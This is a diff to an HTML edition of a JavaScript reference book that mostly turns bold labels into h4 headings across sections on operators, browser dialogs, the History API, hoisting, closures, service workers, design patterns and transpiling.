+<h4>Example:</h4>
 <pre>
 localStorage.setItem(&quot;greet&quot;, &quot;hi&quot;);
 localStorage.removeItem(&quot;greet&quot;);
@@ -13487,7 +13492,7 @@ console.log(localStorage.getItem(&quot;greet&quot;) ); // <i>null</i>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch34-1">Section 34.1: Accessing data attributes</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>Using the dataset property</b></p>
+<h4>Using the dataset property</h4>
 <p>The new dataset property allows access (for both reading and writing) to all data attributes 
 on any element.</p>
 <pre>
@@ -14549,9 +14554,9 @@ can not be overridden and therefore their functionality is guaranteed.</p>
 <h3 id="ch40-2">Section 40.2: The typeof operator</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>The <b>typeof</b> operator returns the data type of the unevaluated operand as a string.</p>
-<p><b>Syntax:</b></p>
-<P><b>typeof</b> operand</p>
-<p><b>Returns:</b></p>
+<h4>Syntax:</h4>
+<h4>typeof</b> operand</p>
+<h4>Returns:</h4>
 
 <p>These are the possible return values from <b>typeof</b>:</p>
 <table border="1" style="width:200px">
@@ -14609,7 +14614,7 @@ target="_blank" rel="noopener noreferrer">
 Why is document.all defined but typeof document.all returns &quot;undefined&quot;?</a></p>
 
 <!-- page 252 -->
-<p><b>Examples:</b></p>
+<h4>Examples:</h4>
 <pre>
 // <i>returns &apos;number&apos;</i>
 <b>typeof</b> 3.14;
@@ -14650,12 +14655,12 @@ Why is document.all defined but typeof document.all returns &quot;undefined&quot
 <h3 id="ch40-3">Section 40.3: The delete operator</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>The <b>delete</b> operator deletes a property from an object.</p>
-<p><b>Syntax:</b></p>
+<h4>Syntax:</h4>
 <pre>
 <b>delete</b> object.property<br/><br/>
 <b>delete</b> object&lbrack;&apos;property&apos;&rbrack;
 </pre>
-<p><b>Returns:</b></p>
+<h4>Returns:</h4>
 <p>If deletion is successful, or the property did not exist:</p>
 <ul>
   <li><b>true</b></li>
@@ -14666,7 +14671,7 @@ Why is document.all defined but typeof document.all returns &quot;undefined&quot
   <li>Throws an error in strict mode.</li>
 </ul>
 <br/>
-<p><b>Description</b></p>
+<h4>Description</h4>
 <p>The <b>delete</b> operator does not directly free memory. It can
 indirectly free memory if the operation means all references to the
 property are gone.</p>
@@ -14675,7 +14680,7 @@ property are gone.</p>
 same name exists on the object&apos;s prototype chain, the property will
 be inherited from the prototype.</p>
 <p><b>delete</b> does not work on variables or function names.</p>
-<p><b>Examples:</b></p>
+<h4>Examples:</h4>
 <pre>
 // <i>Deleting a property</i>
 foo = 1;  // <i>a global variable is a property of &grave;window&grave;: &grave;window.foo&grave;</i>
@@ -14707,16 +14712,16 @@ console.log(Math.PI);                  // <i>3.141592653589793 (Not deleted)</i>
 <p>The unary plus (+) precedes its operand <i>and evaluates</i> to its
 operand. It attempts to convert the operand to a number, if it isn&apos;t
 already.</p>
-<p><b>Syntax:</b></p>
+<h4>Syntax:</h4>
 <pre>
 +expression
 </pre>
-<p><b>Returns:</b></p>
+<h4>Returns:</h4>
 <ul>
   <li>a Number.</li>
 </ul>
 <br/>
-<p><b>Description</b></p>
+<h4>Description</h4>
 <p>The unary plus (+) operator is the fastest (and preferred) method of
 converting something into a number.</p>
 <p>It can convert:</p>
@@ -14726,7 +14731,7 @@ converting something into a number.</p>
   <li><b>null</b></li>
 </ul>
 <p>Values that can&apos;t be converted will evaluate to <b>NaN</b>.</p>
-<p><b>Examples:</b></p>
+<h4>Examples:</h4>
 <!-- page 254 -->
 <pre>
 &plus;42             // <i>42</i>
@@ -14759,16 +14764,16 @@ string representations:</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>The <b>void</b> operator evaluates the given expression and then returns <b>undefined</b>.</p>
 
-<p><b>Syntax:</b></p>
+<h4>Syntax:</h4>
 <pre>
 <b>void</b> expression
 </pre>
-<p><b>Returns:</b></p>
+<h4>Returns:</h4>
 <ul>
   <li><b>undefined</b></li>
 </ul>
 <br/>
-<p><b>Description</b></p>
+<h4>Description</h4>
 <p>The <b>void</b> operator is often used to obtain the <b>undefined</b>
 primitive value, by means of writing void 0 or void(0). Note that <b>void</b> is an
 operator, not a function, so () is not required.</p>
@@ -15797,7 +15802,7 @@ foo(&apos;unexpectedValue&apos;) // <i>&lt;&dash;&dash; error will be thrown, so
   )
 }
 </pre>
-<p><b>Wrap your function into a promise chain</b></p>
+<h4>Wrap your function into a promise chain</h4>
 <p>Your <b>throw</b> statement will be properly caught when it is already inside a promise chain:</p>
 <pre>
 <b>function</b> foo(arg) {
@@ -16273,7 +16278,7 @@ target="_blank" rel="noopener noreferrer">User Prompts</a> are methods part of t
 <a href="https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Client-side_web_APIs/Introduction" 
 target="_blank" rel="noopener noreferrer">Web Application API</a> used to invoke Browser
 modals requesting a user action such as confirmation or input.</p>
-<p><b>window.alert(message)</b></p>
+<h4>window.alert(message)</h4>
 <p>Show a modal <i>popup</i> with a message to the user.</p>
 <p>Requires the user to click &lbrack;OK&rbrack; to dismiss.</p>
 <pre>
@@ -16289,7 +16294,7 @@ boolean value <b>true</b> / <b>false</b> respectively.</p>
 <pre>
 confirm(&quot;Delete this comment?&quot;);
 </pre>
-<p><b>result = window.prompt(message, defaultValue)</b></p>
+<h4>result = window.prompt(message, defaultValue)</h4>
 <p>Show a modal <i>popup</i> with the provided message and an input field with an 
 optional pre-filled value. Returns as result the user provided input value.</p>
 <pre>
@@ -16364,13 +16369,13 @@ rel="noopener noreferrer">jsFiddle demo</a></p>
 <p>The altert() method of the window object displays an <i>alert box</i> with a
 specified message and an OK or Cancel button. The text of that button
 depends on the browser and can&apos;t be modified.</p>
-<p><b>Syntax</b></p>
+<h4>Syntax</h4>
 <pre>
 alert(&quot;Hello world!&quot;);
 // <i>Or, alternatively&hellip;</i>
 window.alert(&quot;Hello world!&quot;);
 </pre>
-<p><b>Produces</b></p>
+<h4>Produces</h4>
 <!-- page 282 -->
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <!--~~~~~~~~~~~~~~~~~~~~~ 33. stackoverflow.com says: Hello world! (282) ~~~~~~~~~~~~~~~~~~~~~~~-->
@@ -16402,7 +16407,7 @@ browsers, and its design cannot be modified.</p>
     </tr>
   </tbody>
 </table>
-<p><b>Return value</b></p>
+<h4>Return value</h4>
 <p>alert function doesn&apos;t return any value</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch44-5">Section 44.5: Usage of prompt()</h3>
@@ -16626,7 +16631,7 @@ HTML element into a user-editable area</p>
 <pre>
 <b>&lt;</b><b>div</b> contenteditable<b>&gt;</b>You can <b>&lt;</b><b>b</b><b>&gt;</b>edit<b>&lt;</b><b>/b</b><b>&gt;</b> me!<b>&lt;</b><b>/div</b><b>&gt;</b>
 </pre>
-<p><b>Native Rich-Text editing</b></p>
+<h4>Native Rich-Text editing</h4>
 
 <p>Using <b>JavaScript</b> and <a href="https://w3c.github.io/editing/execCommand.html" 
 target="_blank" rel="noopener noreferrer">execCommandW3C</a> you
@@ -16649,7 +16654,7 @@ document.execCommand(commandId, showUI, value)
 document.execCommand(&quot;bold&quot;, <b>false</b>, &quot;&quot;); // <i>Make selected text bold</i>
 document.execCommand(&quot;formatBlock&quot;, <b>false</b>, &quot;H2&quot;); // <i>Make selected text Block-level &lt;h2&gt;</i>
 </pre>
-<p><b>Quick Start Example:</b></p>
+<h4>Quick Start Example:</h4>
 <pre>
 <b>&lt;button</b>data-edit=&quot;bold&quot;<b>&gt;&lt;b&gt;</b>B<b>&lt;/b&gt;&lt;/button&gt;</b>
 <b>&lt;button</b>data-edit=&quot;italic&quot;<b>&gt;&lt;i&gt;</b>I<b>&lt;/i&gt;&lt;/button&gt;</b>
@@ -16677,7 +16682,7 @@ function edit(event) {
 target="_blank" rel="noopener noreferrer">jsFiddle demo</a>
 <a href="https://jsfiddle.net/RokoCB/yvshdr4q/" 
 target="_blank" rel="noopener noreferrer">Basic Rich-Text editor example (Modern browsers)</a>
-<p><b>Final thoughts</b></p>
+<h4>Final thoughts</h4>
 <p>Even being present for a long time (IE6), implementations and
 behaviors of execCommand vary from browser to browser making
 &quot;building a Fully-featured and cross-browser compatible WYSIWYG
@@ -16767,7 +16772,7 @@ Please have a look on this document:
 <a href="https://developer.mozilla.org/en-US/docs/Web/API/History_API#The_pushState()_method" 
 target="_blank" rel="noopener noreferrer">pushState() method</a>
 
-<p><b>Example:</b></p>
+<h4>Example:</h4>
 <pre>
 window.history.pushState(&quot;http://example.ca&quot;, &quot;Sample Title&quot;, &quot;/example/path.html&quot;);
 </pre>
@@ -16777,7 +16782,7 @@ entry, rather than adding a new one.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch46-2">Section 46.2: history.replaceState()</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>Syntax:</b></p>
+<h4>Syntax:</h4>
 <pre>
 history.replaceState(data, title &lbrack;, url &rbrack;)
 </pre>
@@ -16793,7 +16798,7 @@ entry, rather than replacing the current one.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch46-3">Section 46.3: Load a specific URL from the history list</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>go() method</b></p>
+<h4>go() method</h4>
 <p>The go() method loads a specific URL from the history list. The
 parameter can either be a number which goes to the URL within the
 specific position (-1 goes back one page, 1 goes forward one page), or
@@ -17314,7 +17319,7 @@ be reflected.</p>
 <i>strict-mode</i> or <i>non-strict</i> mode the arguments object remains
 unchanged.</p>
 
-<p><b>Strict mode</b></p>
+<h4>Strict mode</h4>
 <pre>
 <b>function</b> add(a, b) {
   &apos;use strict&apos;;
@@ -17331,7 +17336,7 @@ add(1)
 // <i>1, undefined</i>
 // <i>1, undefined</i>
 </pre>
-<p><b>Non-Strict Mode</b></p>
+<h4>Non-Strict Mode</h4>
 <pre>
 <b>function</b> add(a, b) {
   console.log(arguments&lbrack;0&rbrack;, arguments&lbrack;1&rbrack;);
@@ -17622,7 +17627,7 @@ fixed-length) binary data which you can directly manipulate. Blobs
 contain immutable binary data which can only be accessed through the
 asynchronous File interface.</p>
 <!-- page 303 -->
-<p><b>Convert a Blob to an ArrayBuffer (asynchronous)</b></p>
+<h4>Convert a Blob to an ArrayBuffer (asynchronous)</h4>
 <pre>
 <b>var</b> blob = <b>new</b> Blob(&lbrack;&quot;<b>&bsol;x</b>01<b>&bsol;x</b>02<b>&bsol;x</b>03<b>&bsol;x</b>04&quot;&rbrack;),
   fileReader = <b>new</b> FileReader(),
@@ -17634,7 +17639,7 @@ fileReader.onload = <b>function</b>() {
 fileReader.readAsArrayBuffer(blob);
 </pre>
 <h5>Version ≥ 6</h5>
-<p><b>Convert a Blob to an ArrayBuffer using a Promise (asynchronous)</b></p>
+<h4>Convert a Blob to an ArrayBuffer using a Promise (asynchronous)</h4>
 <pre>
 <b>var</b> blob = <b>new</b> Blob(&lbrack;&quot;<b>&bsol;x</b>01<b>&bsol;x</b>02<b>&bsol;x</b>03<b>&bsol;x</b>&quot;04&rbrack;);
 <b>var</b> arrayPromise = <b>new</b> Promise(<b>function</b>(resolve) {
@@ -17648,7 +17653,7 @@ arrayPromise.then(<b>function</b>(array) {
   console.log(&quot;Array contains&quot;, array.byteLength, &quot;bytes.&quot;);
 });
 </pre>
-<p><b>Convert an ArrayBuffer or typed array to a Blob</b></p>
+<h4>Convert an ArrayBuffer or typed array to a Blob</h4>
 <pre>
 <b>var</b> array = <b>new</b> Uint8Array(&lbrack;0x04, 0x06, 0x07, 0x08&rbrack;);
 <b>var</b> blob = <b>new</b> Blob(&lbrack;array&rbrack;);
@@ -18118,7 +18123,7 @@ the function bar. So even after it returns, bar can still access and
 modify the variable x. The function foo, whose context is captured in
 another function, is said to be a <i>closure</i>.</p>
 
-<p><b>Private data</b></p>
+<h4>Private data</h4>
 <p>This lets us do some interesting things, such as defining &quot;private&quot;
 variables that are visible only to a specific function or set of
 functions. A contrived (but popular) example:</p>
@@ -18148,7 +18153,7 @@ Sample output:
 <p>When makeCounter() is called, a snapshot of the context of that function is saved.
 All code inside makeCountre() will use that snapshot in their execution. Two calls of 
 makeCounter() will thus create two different snapshots, with their own copy of counter.</p>
-<p><b>Immediately-invoked function expressions (IIFE)</b></p>
+<h4>Immediately-invoked function expressions (IIFE)</h4>
 <p>Closures are also used to prevent global namespace pollution, often
 through the use of immediately-invoked function expressions.</p>
 <p><i>Immediately-invoked function expressions</i> (or, perhaps more
@@ -18176,35 +18181,42 @@ for more information on closures.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch56-2">Section 56.2: Hoisting</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>What is hoisting?</b></p>
+<h4>What is hoisting?</h4>
 
 <p><b>Hoisting</b> is a mechanism which moves all variable and function
 declarations to the top of their scope. However, variable assignments
 still happen where they originally were.</p>
 <p>For example, consider the following code:</p>
 <!-- page 313 -->
+
 <pre>
 console.log(foo);  // <i>→ undefined</i>
 <b>var</b> foo = 42;
 console.log(foo);  // <i>→ 42</i>
 </pre>
+
 <p>The above code is the same as:</p>
+
 <pre>
 <b>var</b> foo;    // <i>→ Hoisted variable declaration</i>
 console.log(foo); // <i>→ undefined</i>
 foo = 42;          // <i>→ variable assignment remains in the same place</i>
 console.log(foo);  // <i>→ 42</i>
 </pre>
+
 <p>Note that due to hoisting the above <b>undefined</b> is not the same as
 the not defined resulting from running:</p>
+
 <pre>
 console.log(foo);  // <i>→ foo is not defined</i>
 </pre>
+
 <p>A similar principle applies to functions. When functions are assigned
 to a variable (i.e. a <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/function" 
 target="_blank" rel="noopener noreferrer">function expression</a>), the variable declaration 
 is hoisted while the assignment remains in the same place. The following two code snippets 
 are equivalent.</p>
+
 <pre>
 console.log(foo(2, 3));  // <i>→ foo is not a function</i>
 <b>var</b> foo = <b>function</b>(a, b) {
@@ -18216,24 +18228,30 @@ foo = <b>function</b>(a, b) {
   <b>return</b> a &ast; b;
 }
 </pre>
+
 <p>When declaring <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/function" 
 target="_blank" rel="noopener noreferrer">
 function statements</a>, a different scenario occurs. Unlike function statements, function
 declarations are hoisted to the top of their scope. Consider the following code:</p>
+
 <pre>
 console.log(foo(2, 3));  // <i>→ 6</i>
 <b>function</b> foo(a, b) {
   <b>return</b> a &ast; b;
 }
 </pre>
+
 <p>The above code is the same as the next code snippet due to hoisting:</p>
+
 <pre>
 <b>function</b> foo(a, b) {
   <b>return</b> a &ast; b;
 }
 console.log(foo(2, 3));  // <i>→ 6</i>
 </pre>
+
 <p>Here are some examples of what is and what isn&apos;t hoisting:</p>
+
 <pre>
 // <i>Valid code:</i>
 foo();
@@ -18260,10 +18278,12 @@ foo();
 <b>var</b> bar = <b>function</b>(){};
 foo();
 </pre>
-<p><b>Limitations of Hoisting</b></p>
+
+<h4>Limitations of Hoisting</h4>
 <p>Initializing a variable can not be Hoisted or In simple JavaScript
 Hoists declarations not initialization.</p>
 <p>For example: The below scripts will give different outputs.</p>
+
 <pre>
 <b>var</b> x = 2;
 <b>var</b> y = 4;
@@ -18299,7 +18319,7 @@ y = 4;
 <h3 id="ch56-3">Section 56.3: Difference between var and let</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p><i>(Note: All examples using <b>let</b> are also valid for <b>const</b>)</i></p>
-<p><b>var</b> is available in all versions of JavaScript, while <b>let</b> and
+<h4>var</b> is available in all versions of JavaScript, while <b>let</b> and
 <b>const</b> are part of ECMAScript 6 and <a href="http://caniuse.com/#search=block%20level" 
 target="_blank" rel="noopener noreferrer">only available in some newer browsers</a>.</p>
 <p><b>var</b> is scoped to the containing function or the global space, depending when it is
@@ -18346,7 +18366,7 @@ therefore undeclared outside of it.</p>
 
 <p>There are several other crucial differences:</p>
 
-<p><b>Global variable declaration</b></p>
+<h4>Global variable declaration</h4>
 <p>In the top scope (outside any functions and blocks), <b>var</b>
 declarations put an element in the global object. <b>let</b> does not:</p>
 <pre>
@@ -18355,7 +18375,7 @@ declarations put an element in the global object. <b>let</b> does not:</p>
 console.log(<b>this</b>.x);  // <i>&gt;&gt;4</i>
 console.log(<b>this</b>.y);  // <i>&gt;&gt;undefined</i>
 </pre>
-<p><b>Re-declaration</b></p>
+<h4>Re-declaration</h4>
 <p>Declaring a variable twice using <b>var</b> doesn&apos;t produce an error
 (even though it&apos;s equivalent to declaring it once):</p>
 <pre>
@@ -18400,7 +18420,7 @@ will throw a ReferenceError if used before the second is declared.</p>
 <blockquote>
 ReferenceError: i is not defined
 </blockquote>
-<p><b>Hoisting</b></p>
+<h4>Hoisting</h4>
 <p>Variables declared both with <b>var</b> and <b>let</b> are hoisted. The
 difference is that a variable declared with <b>var</b> can be referenced
 before its own assignment, since it gets automatically assigned (with
@@ -19353,7 +19373,7 @@ greeting(user)
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>We are not limited to destructuring an object/array, we can
 destructure a nested object/array.</p>
-<p><b><i>Nested Object Destructuring</i></b></p>
+<h4><i>Nested Object Destructuring</i></h4>
 <pre>
 <b>var</b> obj = {
   a: {
@@ -19371,7 +19391,7 @@ destructure a nested object/array.</p>
 } = obj;
 console.log(x, y, z);  // <i>1,3,2</i>
 </pre>
-<p><b><i>Nested Array Destructuring</i></b></p>
+<h4><i>Nested Array Destructuring</i></h4>
 <pre>
 <b>var</b> arr = &lbrack;1, 2, &lbrack;3, 4&rbrack;, 5&rbrack;;
 <b>var</b> &lbrack;a, , &lbrack;b, c&rbrack;, d&rbrack; = arr;
@@ -19381,7 +19401,7 @@ console.log(a, b, c, d);  // <i>1 3 4 5</i>
 <p>Destructuring is not just limited to a single pattern, we can have
 arrays in it, with n-levels of nesting. Similarly we can destructure
 arrays with objects and vice-versa.</p>
-<p><b><i>Arrays Within Object</i></b></p>
+<h4><i>Arrays Within Object</i></h4>
 <pre>
 <b>var</b> obj = {
   a: 1,
@@ -19748,7 +19768,7 @@ existing function:</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch63-2">Section 63.2: A simple service worker</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>main.js</b></p>
+<h4>main.js</h4>
 <blockquote>
 A service worker is an event-driven worker registered against an
 origin and a path. It takes the form of a JavaScript file that can
@@ -19760,7 +19780,7 @@ network is not available.)
 </blockquote>
 <p>Source: <a href="https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API" 
 target="_blank" rel="noopener noreferrer">MDN</a></p>
-<p><b>Few Things:</b></p>
+<h4>Few Things:</h4>
 <ol type="1" start="1">
   <li>It&apos;s a JavaScript Worker, so it can&apos;t access the DOM directly</li>
   <li>It&apos;s a programmable network proxy</li>
@@ -19786,7 +19806,7 @@ JavaScript will be included in your page via a <b>&lt;script&gt;</b> tag.</p>
     });
 }
 </pre>
-<p><b>sw.js</b></p>
+<h4>sw.js</h4>
 <p>This is the service worker code and is executed in the 
 <a href="https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerGlobalScope" 
 target="_blank" rel="noopener noreferrer">
@@ -19888,13 +19908,13 @@ self.close();
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>After your service worker is registered, the browser will try to
 install & later activate the service worker.</p>
-<p><b>Install event listener</b></p>
+<h4>Install event listener</h4>
 <pre>
 <b>this</b>.addEventListener(&apos;install&apos;, <b>function</b>(event) {
   console.log(&apos;installed&apos;);
 });
 </pre>
-<p><b>Caching</b></p>
+<h4>Caching</h4>
 <p>One can use this install event returned to cache the assets needed to
 run the app offline. Below example uses the cache api to do the same.</p>
 <pre>
@@ -19914,7 +19934,7 @@ run the app offline. Below example uses the cache api to do the same.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch63-7">Section 63.7: Dedicated Workers and Shared Workers</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>Dedicated Workers</b></p>
+<h4>Dedicated Workers</h4>
 <p>A dedicated web worker is only accessible by the script that called it.</p>
 <p>Main application:</p>
 <pre>
@@ -19931,7 +19951,7 @@ self.addEventListener(&apos;message&apos;, <b>function</b>(msg) {
   self.postMessage(msg.data&lbrack;0&rbrack; &plus; msg.data&lbrack;1&rbrack;);
 });
 </pre>
-<p><b>Shared Workers</b></p>
+<h4>Shared Workers</h4>
 <p>A shared worker is accessible by multiple scripts  even if they are
 being accessed by different windows, iframes or even workers.</p>
 <p>Creating a shared worker is very similar to how to create a dedicated
@@ -20159,7 +20179,7 @@ target="_blank" rel="noopener noreferrer">
 <i>&apos;Prefer composition over inheritance&apos;</i></a> is an important and popular 
 programming principle, used to assign behaviors to objects, as opposed to inheriting 
 many often unneeded behaviors.</p>
-<p><b>Behaviour factories</b></p>
+<h4>Behaviour factories</h4>
 <pre>
 <b>var</b> speaker = <b>function</b>(state) {
   <b>var</b> noise = state.noise &vert;&vert; &apos;grunt&apos;;
@@ -20180,7 +20200,7 @@ many often unneeded behaviors.</p>
   };
 };
 </pre>
-<p><b>Object factories</b></p>
+<h4>Object factories</h4>
 <h5>Version ≥ 6</h5>
 <pre>
 <b>var</b> person = <b>function</b> (name, age) {
@@ -20206,7 +20226,7 @@ many often unneeded behaviors.</p>
   );
 };
 </pre>
-<p><b>Usage</b></p>
+<h4>Usage</h4>
 <!-- page 350 -->
 <pre>
 <b>var</b> fred = person(&apos;Fred&apos;, 42);
@@ -20220,7 +20240,7 @@ snowy.speak(); // <i>ERROR: snowy.speak is not a function</i>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch65-3">Section 65.3: Module and Revealing Module Patterns</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>Module Pattern</b></p>
+<h4>Module Pattern</h4>
 <p>The Module pattern is a 
 <a href="https://en.wikipedia.org/wiki/Module_pattern#Module_as_a_design_pattern" 
 target="_blank" rel="noopener noreferrer">
@@ -20247,7 +20267,7 @@ exposing an interface we wish other parts of our application to use.</p>
 <b>return</b> api;
 })( <i>/&ast; pass initialization data if necessary &ast;/</i>);
 </pre>
-<p><b>Revealing Module Pattern</b></p>
+<h4>Revealing Module Pattern</h4>
 <p>The Revealing Module pattern is a variant in the Module pattern. The
 key differences are that all members (private and public) are defined
 within the closure, the return value is an object literal containing
@@ -20272,7 +20292,7 @@ through direct references rather than through the returned object.</p>
     };
 })(  <i>/&ast; pass initialization data if necessary &ast;/</i>);
 </pre>
-<p><b>Revealing Prototype Pattern</b></p>
+<h4>Revealing Prototype Pattern</h4>
 <p>This variation of the revealing pattern is used to separate the
 constructor to the methods. This pattern allow us to use the
 javascript language like a objected oriented language:</p>
@@ -20299,7 +20319,7 @@ as a blueprint for other objects through prototypal inheritance. This
 pattern is inherently easy to work with in JavaScript because of the
 native support for prototypal inheritance in JS which means we don&apos;t
 need to spend time or effort imitating this topology.</p>
-<p><b>Creating methods on the prototype</b></p>
+<h4>Creating methods on the prototype</h4>
 <pre>
 <b>function</b> Welcome(name) {
   <b>this</b>.name = name;
@@ -20311,7 +20331,7 @@ Welcome.<b>prototype</b>.sayHello = <b>function</b>() {
 welcome.sayHello();
 // <i>=&bsol;Hello, John!</i>
 </pre>
-<p><b>Prototypal Inheritance</b></p>
+<h4>Prototypal Inheritance</h4>
 <p>Inheriting from a &apos;parent object&apos; is relatively easy via the
 following pattern</p>
 <pre>
@@ -20392,7 +20412,7 @@ for an object.</p>
   };
 })();
 </pre>
-<p><b>Usage:</b></p>
+<h4>Usage:</h4>
 <pre>
 // <i>there is no existing instance of Singleton, so it will create one</i>
 <b>var</b> instance1 = Singleton.getInstance();
@@ -20587,7 +20607,7 @@ them into the <b>target</b> language of JavaScript.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch68-1">Section 68.1: Introduction to Transpiling</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
-<p><b>Examples</b></p>
+<h4>Examples</h4>
 <p><b>ES6/ES2015 to ES5 (via <a href="https://babeljs.io/" target="_blank" rel="noopener noreferrer">
 Babel</a>)</b>:</p>
 <p>This ES2015 syntax</p>
@@ -20614,7 +20634,7 @@ alert &quot;I knew it!&quot; <b>if</b> elvis?
   alert(&quot;I knew it!&quot;);
 }
 </pre>
-<p><b>How do I transpile?</b></p>
+<h4>How do I transpile?</h4>
 <p>Most compile-to-JavaScript languages have a transpiler <b>built-in</b>
 (like in CoffeeScript or TypeScript). In this case, you may just need
 to enable the language&apos;s transpiler via config settings or a
@@ -20623,7 +20643,7 @@ transpiler.</p>
 <p>For <b>ES6/ES2016-to-ES5 transpiling</b>, the most prominent transpiler
 being used is <a href="https://babeljs.io/" target="_blank" rel="noopener noreferrer">
 Babel</a>.</p>
-<p><b>Why should I transpile?</b></p>
+<h4>Why should I transpile?</h4>
 <p>The most cited benefits include:</p>
 <ul>
   <li>The ability to use newer syntax reliably</li>
@@ -20647,7 +20667,7 @@ target="_blank" rel="noopener noreferrer">try it out!</a></p>
 worry about compatibility, you can use <a href="https://nodejs.org/en/">Node</a> 
 and <a href="https://babeljs.io/docs/usage/cli/" target="_blank" rel="noopener noreferrer">Babel CLI</a></p>
 
-<p><b>Quick setup of a project with Babel for ES6/7 support</b></p>
+<h4>Quick setup of a project with Babel for ES6/7 support</h4>
 <ol type="1" start="1">
   <li><a href="https://nodejs.org/en/download/" 
     target="_blank" rel="noopener noreferrer">Download</a> and install Node</li>
@@ -20801,7 +20821,7 @@ Specification:</a></b></p>
   <li><b>return</b> statement</li>
   <li><b>throw</b> statement</li>
 </ul>
-<p><b>Examples:</b></p>
+<h4>Examples:</h4>
 <p>When the end of the input stream of tokens is encountered and the
 parser is unable to parse the input token stream as a single complete
 Program, then a semicolon is automatically inserted at the end of the
@@ -20819,7 +20839,7 @@ y
 x;
 ++y;
 </pre>
-<p><b>Array indexing/literals</b></p>
+<h4>Array indexing/literals</h4>
 <!-- page 363 -->
 <pre>
 console.log(&quot;Hello, World&quot;)
@@ -20827,7 +20847,7 @@ console.log(&quot;Hello, World&quot;)
 // <i>is transformed to:</i>
